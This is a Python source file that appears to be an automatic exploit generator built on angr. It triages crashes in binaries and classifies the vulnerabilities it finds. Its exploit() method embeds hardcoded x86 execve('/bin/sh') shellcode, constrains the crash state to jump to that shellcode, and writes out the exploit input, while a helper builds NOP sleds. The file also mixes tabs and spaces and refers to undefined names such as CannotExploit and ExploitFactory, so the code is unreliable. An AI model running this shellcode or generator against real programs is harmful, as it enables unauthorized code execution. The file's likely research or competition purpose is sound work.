# -*- encoding: utf-8 -*-
import logging

l = logging.getLogger("maeg.Crash")
l.setLevel('DEBUG')

import os
import angr
import angrop
import random
import tracer
import hashlib
import operator

from analyzer import Analyzer
from analyzer import Analyzer
from exploiter import Exploiter
from verifier import Verifier

from trace_additions import ChallRespInfo, ZenPlugin
from exploit import Exploit
from vulnerability import Vulnerability
from simuvex import SimMemoryError, s_options as so

class NonCrashingInput(Exception):
    pass

class Crash(object):
    '''
    Triage a crash using angr.
    '''

    def __init__(self, binary, crash=None, pov_file=None, aslr=None, constrained_addrs=None, crash_state=None,
                 prev_path=None, hooks=None, format_infos=None, rop_cache_tuple=None, use_rop=True,
                 explore_steps=0, angrop_object=None):
        '''
        :binary: path to the binary which crashed   
        :crash: string of input which crashed the binary  
        :pov_file: CGC PoV describing a crash   
        :aslr: analyze the crash with aslr on or off   
        :constrained_addrs: list of addrs which have been constrained during exploration  
        :crash_state: an already traced crash state       
        :prev_path: path leading up to the crashing block      
        :hooks: dictionary of simprocedure hooks, addresses to simprocedures    
        :format_infos: a list of atoi FormatInfo objects that should be used when analyzing the crash  
        :rop_cache_tuple: a angrop tuple to load from        
        rop_cache_tuple:angrop——rop gadget finder and chain builder     
        :use_rop: whether or not to use rop           
        :explore_steps: number of steps which have already been explored, should only set by exploration methods       
        :angrop_object: an angrop object, should only be set by exploration methods      
        '''
        # some info from prev path, in order to execute prev path but bypass the crash point.
        self.binary = binary

        self.payloads = []
        self.analyzer = Analyzer(self.binary)
        self.exploiter = Exploiter(self.binary)
        self.verifier = Verifier(self.binary)

        self.crash  = crash
        self.pov_file = pov_file
        self.constrained_addrs = [ ] if constrained_addrs is None else constrained_addrs
        self.hooks = hooks
        self.explore_steps = explore_steps
        if self.explore_steps > 10:
            raise CannotExploit("Too many steps taken during crash exploration")

        self.project = angr.Project(binary)

        # we search for ROP gadgets now to avoid the memory exhaustion bug in pypy   
        # hash binary contents for rop cache name                                    
        # executable file --(md5)--> short string
        binhash = hashlib.md5(open(self.binary).read()).hexdigest()
        # store the result in /tmp
        rop_cache_path = os.path.join("/tmp", "%s-%s-rop" % (os.path.basename(self.binary), binhash))

        if use_rop:
        	# angrop is a rop gadget finder and chain builder. automatically generate rot chains.
        	if angrop_object is not None:
        		self.rop = angrop_object
        	else:
                    self.rop = self.project.analyses.ROP()
                if rop_cache_tuple is not None:
                    l.info("loading rop gadgets from cache tuple")
                    self.rop._load_cache_tuple(rop_cache_tuple)
                elif os.path.exists(rop_cache_path):
                    l.info("loading rop gadgets from cache '%s'", rop_cache_path)
                    self.rop.load_gadgets(rop_cache_path)
                else:
                    self.rop.find_gadgets()
                    self.rop.save_gadgets(rop_cache_path)
        else:
            self.rop = None

        # system info
        self.os = self.project.loader.main_bin.os

        #determine the alsr of a given os and arch
        #we assume linux is going to enfore statckbased aslr
        if aslr is None:
        	self.aslr = True
        else:
        	self.aslr = aslr

        # first explore by the input
        if crash_state is None:
            #run the tracer, grabbing the crash state
            remove_options = {so.TRACK_REGISTER_ACTIONS, so.TRACK_TMP_ACTIONS, so.TRACK_JMP_ACTIONS,so.ACTION_DEPS, so.TRACK_CONSTRAINT_ACTIONS}
            add_options = {so.MEMORY_SYMBOLIC_BYTES_MAP, so.TRACK_ACTION_HISTORY, so.CONCRETIZE_SYMBOLIC_WRITE_SIZES,so.CONCRETIZE_SYMBOLIC_FILE_READ_SIZES}

            # use tracer to get path info at crash point.
            self._tracer = tracer.Tracer(binary, input=self.crash, pov_file=self.pov_file, resiliency=False,
                                         hooks=self.hooks, add_options=add_options, remove_options=remove_options)
            ChallRespInfo.prep_tracer(self._tracer, format_infos)
            ZenPlugin.prep_tracer(self._tracer)
            # crash_state is the state of crash instruction; prev is the previous state of crash state
            prev, crash_state = self._tracer.run(constrained_addrs)

            # if there was no crash we'll have to use the previous path's state
            if crash_state is None:
                self.state = prev.state
            else:
                # the state at crash time 
                self.state = crash_state

            zp = self.state.get_plugin('zen_plugin')
            if crash_state is None and (zp is not None and len(zp.controlled_transmits) == 0):
                l.warning("input did not cause a crash, please check your input carefully!")
                raise NonCrashingInput

            l.debug("done tracing input")
            self.prev = prev

        else:
        	self.state = crash_state
        	self.prev = prev_path
        	self._tracer = None

        # list of actions added during exploitation, probably better object for this attribute to belong to
        self.added_actions = [ ]

        # hacky trick to get all bytes
        memory_writes = sorted(self.state.memory.mem.get_symbolic_addrs())
        l.debug("filtering writes")
        memory_writes = [m for m in memory_writes if m/0x1000 != 0x4347c] # start of pages
        user_writes = [m for m in memory_writes if any("stdin" in v for v in self.state.memory.load(m, 1).variables)] # memory controlled by user
        # flag_writes = [m for m in memory_writes if any(v.startswith("cgc-flag") for v in self.state.memory.load(m, 1).variables)] # cgc-flag control
        l.debug("done filtering writes")

        self.symbolic_mem = self._segment(user_writes)
        # self.flag_mem = self._segment(flag_writes)

        # crash type
        self.crash_types = []
        # action (in case of a bad write or read) which caused the crash
        self.violating_action = None

        l.debug("triaging crash")
        self._triage_crash()



    def _triage_crash(self):
    	# instruction pointer expression(EIP)
    	ip = self.state.regs.ip
    	# base pointer
    	bp = self.state.regs.bp

    	# any arbitrary receives or transmits
    	# TODO : receives
    	zp = self.state.get_plugin('zen_plugin')
        if zp is not None and len(zp.controlled_transmits):
            l.debug("detected arbitrary transmit vulnerability")
            self.crash_types.append(Vulnerability.ARBITRARY_TRANSMIT)

        # we assume a symbolic eip is always exploitable
        if self.state.se.symbolic(ip):
            # how much control of ip do we have?--all or part. state is crash state.
            if self._symbolic_control(ip) >= self.state.arch.bits:
                l.info("detected ip overwrite vulnerability")
                self.crash_types.append(Vulnerability.IP_OVERWRITE)
            else:
                l.info("detected partial ip overwrite vulnerability")
                self.crash_types.append(Vulnerability.PARTIAL_IP_OVERWRITE)

            return

        if self.state.se.symbolic(bp):
            # how much control of bp do we have
            if self._symbolic_control(bp) >= self.state.arch.bits:
                l.info("detected bp overwrite vulnerability")
                self.crash_types.append(Vulnerability.BP_OVERWRITE)
            else:
                l.info("detected partial bp overwrite vulnerability")
                self.crash_types.append(Vulnerability.PARTIAL_BP_OVERWRITE)

            return

        # if nothing obvious is symbolic let's look at actions

        # grab the all actions in the last basic block
        symbolic_actions = []
        for a in list(self.prev.state.log.actions) + list(self.state.log.actions):
        	# do something on memory and the address of memory is symbolic
            if a.type == 'mem':
                if self.state.se.symbolic(a.addr):
                    symbolic_actions.append(a)

        # TODO: pick the crashing action based off the crashing instruction address,
        # crash fixup attempts will break on this
        for sym_action in symbolic_actions:
            if sym_action.action == "write":
                if self.state.se.symbolic(sym_action.data):
                    # data is symbolic and addr is symbolic
                    l.info("detected write-what-where vulnerability")
                    self.crash_types.append(Vulnerability.WRITE_WHAT_WHERE)
                else:
                    # data is not symbolic but addr is symbolic
                    l.info("detected write-x-where vulnerability")
                    self.crash_types.append(Vulnerability.WRITE_X_WHERE)

                self.violating_action = sym_action
                break

            if sym_action.action == "read":
                # special vulnerability type, if this is detected we can explore the crash further
                l.info("detected arbitrary-read vulnerability")
                self.crash_types.append(Vulnerability.ARBITRARY_READ)

                self.violating_action = sym_action
                break

        return


    def _symbolic_control(self, st):
        '''
        determine the amount of symbolic bits in an ast, useful to determining how much control we have
        over registers
        '''

        sbits = 0

        for bitidx in xrange(self.state.arch.bits):
            if st[bitidx].symbolic:
                sbits += 1

        return sbits


    def explorable(self):
        '''
        determine if the crash can be explored with the 'crash explorer'.
        :return: True if the crash's type lends itself to exploring, only 'arbitrary-read' for now
        '''

        # TODO add arbitrary receive into this list
        explorables = [Vulnerability.ARBITRARY_READ, Vulnerability.WRITE_WHAT_WHERE, Vulnerability.WRITE_X_WHERE]
        #exploitables = [Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE, Vulnerability.BP_OVERWRITE,
        #        Vulnerability.PARTIAL_BP_OVERWRITE, Vulnerability.WRITE_WHAT_WHERE, Vulnerability.WRITE_X_WHERE]

        return self.one_of(explorables)

    def explore(self, path_file=None):
        '''
        explore a crash further to find new bugs
        '''

        # crash should be classified at this point
        if not self.explorable():
                raise CannotExplore("non-explorable crash")

        self._reconstrain_flag_data(self.state)
        # violating_action is previously found symbolic action
        assert self.violating_action is not None

        if self.one_of([Vulnerability.ARBITRARY_READ]):
            self._explore_arbitrary_read(path_file)
        elif self.one_of([Vulnerability.WRITE_WHAT_WHERE, Vulnerability.WRITE_X_WHERE]):
            self._explore_arbitrary_write(path_file)
        else:
            raise CannotExplore("unknown explorable crash type: %s", self.crash_types)

    def exploitable(self):
    	'''
        determine if the crash is exploitable
        :return: True if the crash's type is generally considered exploitable, False otherwise
        '''
        exploitables = [Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE, Vulnerability.BP_OVERWRITE,
                Vulnerability.PARTIAL_BP_OVERWRITE, Vulnerability.WRITE_WHAT_WHERE, Vulnerability.WRITE_X_WHERE]

        return self.one_of(exploitables)

    def _prepare_exploit_factory(self, blacklist_symbolic_explore=True, **kwargs):
        # crash should have been classified at this point
        if not self.exploitable():
            raise CannotExploit("non-exploitable crash")

        if blacklist_symbolic_explore:
            if "blacklist_techniques" in kwargs:
                kwargs["blacklist_techniques"].add("explore_for_exploit")
            else:
                kwargs["blacklist_techniques"] = {"explore_for_exploit"}

        exploit = ExploitFactory(self, **kwargs)

        return exploit

    # def exploit(self):
    #     self.analysis = self.analyzer.analyze(self.prev)
    #     for payload in self.exploiter.generate(self.prev, self.analysis):
    #         if not payload:
    #             break
    #         if self.verifier.verify(payload):
    #             self.payloads.append(payload)
    #             l.info('Generated!')
    #             return True
    #     l.info('Can not generate any payload.')
    #     return False

    def exploit(self, blacklist_symbolic_explore=True, **kwargs):
        '''
        craft an exploit for a crash
        '''

        # factory = self._prepare_exploit_factory(blacklist_symbolic_explore, **kwargs)

        # factory.initialize()
        # return factory
        shellcode = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')
        # self.jump_addr, self.mem_start = self._ip_overwrite_call_shellcode(shellcode)

        control = {}
        min_addr = self.project.loader.main_bin.get_min_addr()
        max_addr = self.project.loader.main_bin.get_max_addr()
        for addr in self.symbolic_mem:
            if addr >= min_addr and addr < max_addr:
                control[addr] = self.symbolic_mem[addr]
        # assert len(control) > 0
        sc_bvv = self.state.se.BVV(shellcode)
        buf_addr = control.keys()[0]
        memory = self.state.memory.load(buf_addr, len(shellcode))
        if self.state.satisfiable(extra_constraints=(memory == sc_bvv,self.state.regs.pc == buf_addr)):
            l.info("found buffer for shellcode, completing exploit")
            self.state.add_constraints(memory == sc_bvv)
            l.info("pointing pc towards shellcode buffer")
            self.state.add_constraints(self.state.regs.pc == buf_addr)
        else:
            l.error('wrong, can\'t solve constraint')
        filename = '%s-exploit' % self.binary
        with open(filename,'w') as f:
            f.write(self.state.posix.dumps(0))
        print "%s exploit in %s" % (self.binary, filename)
        print "run with `(cat %s; cat -) | %s`" % (filename, self.binary) 

    def _ip_overwrite_call_shellcode(self, shellcode, variables=None):
        '''
        exploit an ip overwrite with shellcode
        :param shellcode: shellcode to call
        :param variables: variables to check unconstrainedness of
        :return: tuple of the address to jump to, and address of requested shellcode in memory
        '''

        # TODO inspect register state and see if any registers are pointing to symbolic memory
        # if any registers are pointing to symbolic memory look for gadgets to call or jmp there

        if variables is None:
            variables = [ ]

        # accumulate valid memory, this depends on the os and memory permissions
        valid_memory = { }

        # XXX linux special case, bss is executable if the stack is executable
        if self.project.loader.main_bin.execstack and self.os == "unix":
            valid_memory.update(self._global_control())

        # hack! max address hueristic for CGC
        for mem, _ in sorted(valid_memory.items(), \
                key=lambda x: (0xffffffff - x[0]) + x[1])[::-1]:
            for mem_start in xrange(mem+valid_memory[mem]-(len(shellcode)/8), mem, -1):

                # default jump addr is the shellcode
                jump_addr = mem_start

                shc_constraints = [ ]

                shc_constraints.append(self.state.regs.ip == mem_start)

                sym_mem = self.state.memory.load(mem_start, len(shellcode))
                shc_constraints.append(sym_mem == shellcode)

                # hack! TODO: make this stronger/more flexible
                for v in variables:
                    shc_constraints.append(v == 0x41414141)

                if self.state.satisfiable(extra_constraints=shc_constraints):

                    # room for a nop sled?
                    length = mem_start - mem
                    if length > 0:

                        # try to add a nop sled, we could be more thorough, but it takes too
                        # much time
                        new_nop_constraints = [ ]

                        sym_nop_mem = self.state.memory.load(mem, length)
                        nop_sld_bvv = self.state.se.BVV("\x90" * length)
                        nop_const = sym_nop_mem == nop_sld_bvv

                        # can the nop sled exist?
                        new_nop_constraints.append(nop_const)
                        # can the shellcode still exist?
                        new_nop_constraints.append(sym_mem == shellcode)
                        # can ip point to the nop sled?
                        new_nop_constraints.append(self.state.regs.ip == mem)

                        if self.state.satisfiable(extra_constraints=new_nop_constraints):
                            jump_addr = mem

                    return (jump_addr, mem_start)

        raise CannotExploit("no place to fit shellcode")

    def _global_control(self):
        '''
        determine what symbolic memory we control which is at a constant address
        '''

        control = { }

        # PIE binaries will give no global control without knowledge of the binary base
        if self.project.loader.main_bin.pic:
            return control

        min_addr = self.project.loader.main_bin.get_min_addr()
        max_addr = self.project.loader.main_bin.get_max_addr()
        for addr in self.symbolic_mem:
            if addr >= min_addr and addr < max_addr:
                control[addr] = self.symbolic_mem[addr]

        return control

    def save(self, file_name = None):
        file_name = self.binary + '1' if file_name is None else file_name
        if len(self.payloads) == 1:
            ext = 'py' if self.payloads[0].ptype == 'script' else 'exp'
            self._save(self.payloads[0].content, '%s.%s' % (file_name, ext))
        else:
            for i in xrange(len(self.payloads)):
                ext = 'py' if self.payloads[0].ptype == 'script' else 'exp'
                self._save(self.payloads[i].content,'%s-%d.%s' % (file_name, i, ext))

    def _save(self, payload, file_name):
        with open(file_name, 'w') as f:
            f.write(payload)

    def one_of(self, crash_types):
        '''
        Test if a self's crash has one of the vulnerabilities described in crash_types
        '''

        if not isinstance(crash_types, (list, tuple)):
            crash_types = [crash_types]

        return bool(len(set(self.crash_types).intersection(set(crash_types))))

    def copy(self):
        cp = Crash.__new__(Crash)
        cp.binary = self.binary
        cp.crash = self.crash
        cp.project = self.project
        cp.os = self.os
        cp.aslr = self.aslr
        cp.prev = self.prev.copy()
        cp.state = self.state.copy()
        cp.rop = self.rop
        cp.added_actions = list(self.added_actions)
        cp.symbolic_mem = self.symbolic_mem.copy()
        cp.flag_mem = self.flag_mem.copy()
        cp.crash_types = self.crash_types
        cp._tracer = self._tracer
        cp.violating_action = self.violating_action
        cp.explore_steps = self.explore_steps
        cp.constrained_addrs = list(self.constrained_addrs)

        return cp

    def _reconstrain_flag_data(self, state):

        l.info("reconstraining flag")

        replace_dict = dict()
        # constrain input: <Bool file_/dev/stdin_39_0_4139_8 == 65>
        for c in self._tracer.preconstraints:
            if any([v.startswith('cgc-flag') or v.startswith("random") for v in list(c.variables)]):
                concrete = next(a for a in c.args if not a.symbolic)
                symbolic = next(a for a in c.args if a.symbolic)
                replace_dict[symbolic.cache_key] = concrete
        cons = state.se.constraints
        new_cons = []
        for c in cons:
            new_c = c.replace_dict(replace_dict)
            new_cons.append(new_c)
        state.release_plugin("solver_engine")
        state.add_constraints(*new_cons)
        state.downsize()
        state.se.simplify()

    @staticmethod
    def _segment(memory_writes):
        # symblic addr and the length
        segments = { }
        memory_writes = sorted(memory_writes)

        if len(memory_writes) == 0:
            return segments

        current_w_start = memory_writes[0]
        current_w_end = current_w_start + 1

        for write in memory_writes[1:]:
            write_start = write
            write_len = 1

            # segment is completely seperate
            if write_start > current_w_end:
                # store the old segment
                segments[current_w_start] = current_w_end - current_w_start

                # new segment, update start and end
                current_w_start = write_start
                current_w_end = write_start + write_len
            else:
                # update the end of the current segment, the segment `write` exists within current
                current_w_end = max(current_w_end, write_start + write_len)


        # write in the last segment
        segments[current_w_start] = current_w_end - current_w_start

        return segments

    def _explore_arbitrary_read(self, path_file=None):
        # crash type was an arbitrary-read, let's point the violating address at a
        # symbolic memory region
        # symbolic_mem is the result of segment user_write : addr : len
        largest_regions = sorted(self.symbolic_mem.items(),
                key=operator.itemgetter(1),
                reverse=True)

        min_read = self.state.se.min(self.violating_action.addr)
        max_read = self.state.se.max(self.violating_action.addr)

        largest_regions = map(operator.itemgetter(0), largest_regions)
        # filter addresses which fit between the min and max possible address
        largest_regions = filter(lambda x: (min_read <= x) and (x <= max_read), largest_regions)

        # populate the rest of the list with addresses from the binary
        min_addr = self.project.loader.main_bin.get_min_addr()
        max_addr = self.project.loader.main_bin.get_max_addr()
        pages = range(min_addr, max_addr, 0x1000)
        pages = filter(lambda x: (min_read <= x) and (x <= max_read), pages)

        read_addr = None
        constraint = None
        for addr in largest_regions + pages:
            read_addr = addr
            constraint = self.violating_action.addr == addr

            if self.state.se.satisfiable(extra_constraints=(constraint,)):
                break

            constraint = None

        if constraint is None:
            raise CannotExploit("unable to find suitable read address, cannot explore")

        self.state.add_constraints(constraint)
        # find where to read
        l.debug("constraining input to read from address %#x", read_addr)

        l.info("starting a new crash exploration phase based off the crash at address 0x%x", self.violating_action.ins_addr)

        new_input = ChallRespInfo.atoi_dumps(self.state)
        if path_file is not None:
            l.info("dumping new crash evading input into file '%s'", path_file)
            with open(path_file, 'w') as f:
                f.write(new_input)

        # create a new crash object starting here
        use_rop = False if self.rop is None else True
        self.__init__(self.binary,
                new_input,
                explore_steps=self.explore_steps + 1,
                constrained_addrs=self.constrained_addrs + [self.violating_action],
                use_rop=use_rop,
                angrop_object=self.rop)


    def _explore_arbitrary_write(self, path_file=None):
        # crash type was an arbitrary-write, this routine doesn't care about taking advantage
        # of the write it just wants to try to find a more valuable crash by pointing the write
        # at some writable memory

        # find a writable data segment

        elf_objects = self.project.loader.all_elf_objects

        assert len(elf_objects) > 0, "target binary is not ELF or CGC, unsupported by rex"

        min_write = self.state.se.min(self.violating_action.addr)
        max_write = self.state.se.max(self.violating_action.addr)

        segs = [ ]
        for eobj in elf_objects:
            segs.extend(filter(lambda s: s.is_writable, eobj.segments))
        # 
        segs = filter(lambda s: (s.min_addr <= max_write) and (s.max_addr >= min_write), segs)

        write_addr = None
        constraint = None
        for seg in segs:
            for page in range(seg.min_addr, seg.max_addr, 0x1000):
                write_addr = page
                constraint = self.violating_action.addr == page

                if self.state.se.satisfiable(extra_constraints=(constraint,)):
                    break

                constraint = None

        if constraint is None:
            raise CannotExploit("Cannot point write at any writeable segments")

        self.state.add_constraints(constraint)
        l.debug("constraining input to write to address %#x", write_addr)

        l.info("starting a new crash exploration phase based off the crash at address %#x",
                self.violating_action.ins_addr)
        new_input = ChallRespInfo.atoi_dumps(self.state)
        if path_file is not None:
            l.info("dumping new crash evading input into file '%s'", path_file)
            with open(path_file, 'w') as f:
                f.write(new_input)

        use_rop = False if self.rop is None else True
        self.__init__(self.binary,
                new_input,
                explore_steps=self.explore_steps + 1,
                constrained_addrs=self.constrained_addrs + [self.violating_action],
                use_rop=use_rop,
                angrop_object=self.rop)

